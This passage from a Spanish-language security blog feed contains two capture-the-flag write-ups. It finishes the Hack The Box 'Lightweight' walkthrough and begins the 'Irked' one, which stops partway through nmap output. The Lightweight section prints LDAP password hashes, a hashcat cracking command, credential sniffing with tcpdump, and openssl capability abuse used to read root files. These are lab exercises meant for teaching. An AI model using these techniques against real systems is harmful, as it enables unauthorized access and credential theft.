Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE VERSION
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ldap-search: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Context: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: dcObject
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organization
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         o: lightweight htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         dc: lightweight
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Manager,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalRole
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: Manager
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         description: Directory Manager
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalUnit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         ou: People
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalUnit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         ou: Group
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser1,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uid: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         sn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         mail: ldapuser1@lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: person
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: inetOrgPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: shadowAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$6$3&lt;/span&gt;qx0SD9x&lt;span class=&#34;nv&#34;&gt;$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj&lt;/span&gt;.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowLastChange: &lt;span class=&#34;m&#34;&gt;17691&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMax: &lt;span class=&#34;m&#34;&gt;99999&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowWarning: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         loginShell: /bin/bash
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         homeDirectory: /home/ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser2,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uid: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         sn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         mail: ldapuser2@lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: person
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: inetOrgPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: shadowAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$6$xJxPjT0M$1&lt;/span&gt;m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowLastChange: &lt;span class=&#34;m&#34;&gt;17691&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMax: &lt;span class=&#34;m&#34;&gt;99999&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowWarning: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         loginShell: /bin/bash
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         homeDirectory: /home/ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser1,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixGroup
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;x
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser2,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixGroup
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;x
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_        gidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; at Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:40:14 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; -- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 14.17 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;hashcat&#34;&gt;HASHCAT&lt;/h2&gt;
&lt;p&gt;Ya que encontramos contraseñas encriptadas podriamos utilizar hashcat para realizar un ataque a contraseña pero este metodo podria tardar mucho tiempo tomando en cuenta el tamaño de nuestro diccionario, por lo que vamos a seguir buscando por otros lados acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;1800&lt;/span&gt; -o pass.txt ldap-password.txt /usr/share/wordlist/rockyou.txt --force ldap-password.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$6$3&lt;/span&gt;qx0SD9x&lt;span class=&#34;nv&#34;&gt;$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj&lt;/span&gt;.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
&lt;span class=&#34;nv&#34;&gt;$6$xJxPjT0M$1&lt;/span&gt;m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Ya que esta maquina tiene el puerto http abierto procedemos a visitar la pagina, y nos muestra un mensaje  &lt;code&gt;This site is protected by agains bruteforging.&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar las paginas disponibles encontramos&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la pagina de user nos muestra un mensaje &lt;code&gt;This server lets you get in with ssh. Your IP (10.10.12.63) is automatically added as userid and password within a minute of your first http page request... &lt;/code&gt;, la pagina nos genera un usuario (IP) y contraseña (IP) con los cuales podemos ingresar a la maquina por el puerto 22 de ssh.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/3.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales que nos proporciona la pagina y obtenemos una shell atravez de ssh con privilegios de bajo nivel.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/4.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que no encontramos software con privilegios (SUID, GUID) que nos pueda ayudar a escalar privilegios procedemos a buscar software con ciertas &lt;a href=&#34;https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/&#34;&gt;&lt;strong&gt;capacidades&lt;/strong&gt;&lt;/a&gt; (getcap/setcap).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/5.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos tcpdump que es utilizado para analizar el trafico de una red, y tiene &lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; y &lt;code&gt;CAP_NET_RAW&lt;/code&gt;, para realizar operaciones relacionadas a la red.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;tcpdump&#34;&gt;TCPDUMP&lt;/h2&gt;
&lt;p&gt;Utilizamos tcpdump para ver que cosas interesantes nos podemos capturar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/6.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar un analisis al archivo encontramos algo interesante, puesto que la maquina es un servidor http y ldap al mismo tiempo de alguna forma al realizar el listado de IPs baneadas el servidor hace una verificacion mediante ldap para poder actualizar dicha pagina y en los paquetes capturados encontramos al usuario ldapuser2 y su contraseña.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/7.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales encontradas y obtenemos una shell como ldapuser2 y el &lt;code&gt;user.txt&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/8.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En nuestra carpeta como usuario ldapuser2 encontramos un archivo &lt;code&gt;backup.7z&lt;/code&gt; al intentar descomprimirlo nos pide una contraseña. Utilizamos fuerza bruta para poder encontrar y descomprimir el contenido del archivo, para ello &lt;a href=&#34;https://github.com/philsmd/7z2hashcat&#34;&gt;&lt;strong&gt;7z2hashcat.pl&lt;/strong&gt;&lt;/a&gt; nos fue de gran ayuda.&lt;/p&gt;
&lt;p&gt;Al descomprimir el contenido de &lt;code&gt;backup.7z&lt;/code&gt; encontramos lo siguiente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/9.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos cada uno de los archivos encontramos al usuario ldapuser1 y su contraseña en &lt;code&gt;status.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;openssl&#34;&gt;OPENSSL&lt;/h2&gt;
&lt;p&gt;Al realizar una busqueda de algun software para escalar privilegios encontramos que openssl tiene las capacidades habilitadas y permitidas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos openssl para hacer bypass &lt;a href=&#34;https://gtfobins.github.io/gtfobins/openssl/&#34;&gt;&lt;strong&gt;(openssl)&lt;/strong&gt;&lt;/a&gt;, leer y escribir archivos. En este caso vamos a utilizar &lt;code&gt;openssl&lt;/code&gt; para leer el &lt;code&gt;root.txt&lt;/code&gt; flag que se encuentra en &lt;code&gt;/root/root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/light/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/light/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Irked</title>
        <link>https://sckull.github.io/posts/irked/</link>
        <pubDate>Sat, 20 Apr 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 20 Apr 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/irked/</guid>
        <description>Irked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Irked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.117
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.081s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65205&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;323&lt;/span&gt; filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.10 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
111/tcp   open  rpcbind 2-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; rpcinfo:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   program version   port/proto  service
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  2,3,4        111/tcp  rpcbind
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  2,3,4        111/udp  rpcbind
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          47041/udp  status
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          48216/tcp  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
48216/tcp open  status  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100024)&lt;/span&gt;
65534/tcp open  irc     UnrealIRCd
No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
TCP/IP fingerprint:
